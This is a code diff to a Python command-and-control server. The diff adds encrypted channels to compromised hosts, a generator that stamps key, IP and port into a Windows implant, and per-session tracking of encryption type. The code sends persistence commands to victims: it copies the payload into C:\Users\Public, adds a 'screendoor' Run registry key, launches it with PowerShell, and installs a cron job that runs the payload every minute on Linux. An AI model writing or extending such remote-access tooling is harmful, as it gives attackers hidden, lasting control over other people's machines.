@@ -13,6 +13,13 @@ from datetime import datetime
 import shutil
 import subprocess
 import base64
+from cryptography.fernet import Fernet
+
+def encrypt(message: bytes, key: bytes) -> bytes:
+    return Fernet(key).encrypt(message)
+
+def decrypt(token: bytes, key: bytes) -> bytes:
+    return Fernet(key).decrypt(token)
 
 def help():
     print('''
@@ -116,6 +123,40 @@ def linplant():
     else:
         print('[-] Some error occurred with generation.')
 
+def winplant_symmetric():
+    # Payload random name generator
+    ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    file_name = f'{ran_name}.py'
+
+    # Get current directory
+    check_cwd = os.getcwd()
+
+    # Check if paylaod exists and if exists, copy it to the name of othe new file
+    if os.path.exists(f'{check_cwd}\\winplantSymmetric.py'):
+        shutil.copy('winplantSymmetric.py', file_name)
+    else:
+        print('[-] winplant.py file not found.')
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_KEY_HERE', str(key))
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
+    with open(file_name, 'w') as f:
+        f.write(new_host)
+        f.close()
+    with open(file_name) as f:
+        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
+    with open(file_name, 'w') as f:
+        f.write(new_port)
+        f.close()
+    # path check commands in payload handling
+    if os.path.exists(f'{file_name}'):
+        print(f'[+] {file_name} saved to {check_cwd}')
+    else:
+        print('[-] Some error occurred with generation.')
+
 def exeplant():
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
@@ -158,73 +199,19 @@ def banner():
     print("├┴┐└┬┘║  │ │├┬┘├┤  │")
     print("└─┘ ┴ ╩═╝└─┘┴└─└─┘ ┴")
 
+def comm_in_symmetric(targ_id):
+    print("[+] Awaiting symmetric response...")
+    response = targ_id.recv(4096)
+    response = decrypt(response, key).decode('utf-8')
+    print("Debug response: ", response)
+    return response
+
 def comm_in(targ_id):
     print('[+] Awaiting response...')
     response = targ_id.recv(4096).decode()
     response = base64.b64decode(response)
     response = response.decode().strip()
     return response
-
-def comm_out(targ_id, message):
-    message = str(message)
-    message = base64.b64encode(bytes(message, encoding='utf8'))
-
-    targ_id.send(message)
-
-def kill_sig(targ_id, message):
-    message = str(message)
-    message = base64.b64encode(bytes(message, encoding='utf8'))
-    targ_id.send(message)
-
-def target_comm(targ_id, targets, num):
-    while True:
-        message = input(f'{targets[num][3]}/{targets[num][1]}#>')
-        if len(message) == 0:
-            continue
-        if message == "help":
-            pass
-        else:
-            comm_out(targ_id, message)
-        if message == 'exit':
-            message = base64.b64encode(message.encode())
-            targ_id.send(message)
-            targ_id.close()
-            targets[num][7] = "Dead"
-            break
-        if message == 'background':
-            break
-        if message == "help":
-            pass
-        if message == 'persist':
-            payload_name = input("[+] Enter the name of the payload to add to persistence: ")
-            print(f'Payload name: {payload_name}')
-            if targets[num][6] == 1:
-                persist_command_1 = f'cmd.exe /c move {payload_name} C:\\Users\\Public\\Win32.exe'
-                #persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
-                persist_command_1 = base64.b64encode(persist_command_1.encode())
-                targ_id.send(persist_command_1)
-                #persist_command_3 = f'cmd.exe /c del {payload_name}'
-                #persist_command_3 = base64.b64encode(persist_command_3.encode())
-                #targ_id.send(persist_command_3)
-                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\Win32.exe'
-                persist_command_2 = base64.b64encode(persist_command_2.encode())
-                targ_id.send(persist_command_2)
-                persist_command_4 = f'powershell -command \"Start-Process -FilePath \"C:\\Users\\Public\\Win32.exe"'
-                persist_command_4 = base64.b64encode(persist_command_4.encode())
-                targ_id.send(persist_command_4)
-                print("[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
-            if targets[num][6] == 2:
-                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
-                persist_command = base64.b64encode(persist_command.encode())
-                targ_id.send(persist_command)
-                print('[+] Run this command to clean up the crontab: \n crontab -r')
-        else:
-            response = comm_in(targ_id)
-            if response == "exit":
-                print('[-] The client has terminated the session.')
-                targ_id.close()
-                break
-            print(response)
 
 def comm_handler():
     # Remote_ip returns a tupple of the IP and the Port, so if you use remote_ip[0], only the ip will be returned.
@@ -239,6 +226,8 @@ def comm_handler():
             admin = base64.b64decode(admin).decode()
             op_sys = remote_target.recv(4096).decode()
             op_sys = base64.b64decode(op_sys).decode()
+            encryption_type = remote_target.recv(1024).decode()
+            encryption_type = base64.b64decode(encryption_type).decode()
             if admin == 1:
                 admin_val = "Yes"
             else:
@@ -253,15 +242,116 @@ def comm_handler():
             time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val, 'Active'])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val, 'Active', encryption_type])
                 print(f'[+] Connection reveived from {host_name[0]}@{remote_ip[0]}\nEnter command#>')
             else:
-                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, 'Active'])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, 'Active', encryption_type])
                 print(f'[+] Connection reveived from {remote_ip[0]}\nEnter command#>')
 
         except:
             pass
 
+def comm_out_symmetric(targ_id, message):
+    try:
+        #Is this line necessary?
+        message = str(message)
+        message = encrypt(message.encode('utf-8'), key)
+        targ_id.send(message)
+    except ConnectionRefusedError:
+        print('[-] Connection Refused Error')
+def comm_out(targ_id, message):
+    try:
+        message = str(message)
+        message = base64.b64encode(bytes(message, encoding='utf8'))
+
+        targ_id.send(message)
+    except ConnectionRefusedError:
+        print('[-] Connection Refused Error')
+        #comm_handler()
+
+
+def kill_sig(targ_id, message):
+    message = str(message)
+    message = base64.b64encode(bytes(message, encoding='utf8'))
+    targ_id.send(message)
+
+def target_comm(targ_id, targets, num):
+    while True:
+        message = input(f'{targets[num][3]}/{targets[num][1]}#>')
+        if len(message) == 0:
+            continue
+        if message == "help":
+            pass
+        else:
+            if targets[num][8] == "Symmetric":
+                comm_out_symmetric(targ_id, message)
+            if targets[num][8] == "Base64":
+                comm_out(targ_id, message)
+            if targets[num][8] == "Asymmetric":
+                pass
+
+        if message == 'exit':
+            if targets[num][8] == "Symmetric":
+                message = encrypt(message.encode('utf-8'), key)
+                targ_id.send(message)
+                targ_id.close()
+                targets[num][7] = "Dead"
+                break
+            if targets[num][8] == "Base64":
+                message = base64.b64encode(message.encode())
+                targ_id.send(message)
+                targ_id.close()
+                targets[num][7] = "Dead"
+                break
+            if targets[num][8] == "Asymmetric":
+                pass
+
+        if message == 'background':
+            break
+        if message == "help":
+            pass
+        if message == 'persist':
+            payload_name = input("[+] Enter the name of the payload to add to persistence: ")
+            print(f'Payload name: {payload_name}')
+            if targets[num][6] == 1:
+                persist_command_1 = f'cmd.exe /c move {payload_name} C:\\Users\\Public\\Win32.exe'
+                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\Win32.exe'
+                persist_command_3 = f'powershell -command \"Start-Process -FilePath \"C:\\Users\\Public\\Win32.exe"'
+                if targets[num][8] == "Symmetric":
+                    persist_command_1 = encrypt(persist_command_1.encode('utf-8'), key)
+                    persist_command_2 = encrypt(persist_command_2.encode('utf-8'), key)
+                    persist_command_3 = encrypt(persist_command_3.encode('utf-8'), key)
+                    targ_id.send(persist_command_1)
+                    targ_id.send(persist_command_2)
+                    targ_id.send(persist_command_3)
+                if targets[num][8] == "Base64":
+                    persist_command_1 = base64.b64encode(persist_command_1.encode())
+                    targ_id.send(persist_command_1)
+                    persist_command_2 = base64.b64encode(persist_command_2.encode())
+                    targ_id.send(persist_command_2)
+                    persist_command_3 = base64.b64encode(persist_command_3.encode())
+                    targ_id.send(persist_command_3)
+                if targets[num][8] == "Asymmetric":
+                    pass
+
+                print("[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
+            if targets[num][6] == 2:
+                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
+                persist_command = base64.b64encode(persist_command.encode())
+                targ_id.send(persist_command)
+                print('[+] Run this command to clean up the crontab: \n crontab -r')
+        else:
+            if targets[num][8] == "Symmetric":
+                response = comm_in_symmetric(targ_id)
+            if targets[num][8] == "Base64":
+                response = comm_in(targ_id)
+            if targets[num][8] == "Asymmetric":
+                pass
+            if response == "exit":
+                print('[-] The client has terminated the session.')
+                targ_id.close()
+                break
+            print(response)
 
 
 def listener_handler():
@@ -292,9 +382,22 @@ if __name__ == '__main__':
                 listener_counter += 1
             if command == "winplant py":
                 if listener_counter > 0:
+                    b64Activated = True
+                    symmetricActivated = False
+                    asymmetricActivated = False
                     winplant()
                 else:
                     print("[-] You cannot generate a payload with an active listener")
+            if command == "winplantSymmetric py":
+                if listener_counter > 0:
+                    b64Activated = False
+                    symmetricActivated = True
+                    asymmetricActivated = False
+                    key = Fernet.generate_key()
+                    winplant_symmetric()
+                else:
+                    print("[-] You cannot generate a payload with an active listener")
+
             if command == "linplant py":
                 if listener_counter > 0:
                     linplant()
@@ -315,7 +418,12 @@ if __name__ == '__main__':
                         if target[7] == "Dead":
                             pass
                         else:
-                            comm_out(target[0], "exit")
+                            if target[8] == "Symmetric":
+                                comm_out_symmetric(target[0], "exit")
+                            if target[8] == "Base64":
+                                comm_out(target[0], "exit")
+                            if target[8] == "Asymmetric":
+                                pass
                     kill_flag = 1
                     if listener_counter > 0:
                         sock.close()
@@ -340,10 +448,10 @@ if __name__ == '__main__':
                 #List sessions command handling
                 if command.split(" ")[1] == "-l":
                     myTable = PrettyTable()
-                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time']
+                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time', 'EncryptionType']
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
+                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2], target[8]])
                         session_counter += 1
                     print(myTable)
                 if command.split(" ")[1] == '-i':
@@ -364,7 +472,12 @@ if __name__ == '__main__':
                     if target[7] == "Dead":
                         pass
                     else:
-                        comm_out(target[0], "exit")
+                        if target[8] == "Symmetric":
+                            comm_out_symmetric(target[0], "exit")
+                        if target[8] == "Base64":
+                            comm_out(target[0], "exit")
+                        if target[8] == "Asymmetric":
+                            pass
                 kill_flag = 1
                 if listener_counter > 0:
                     sock.close()
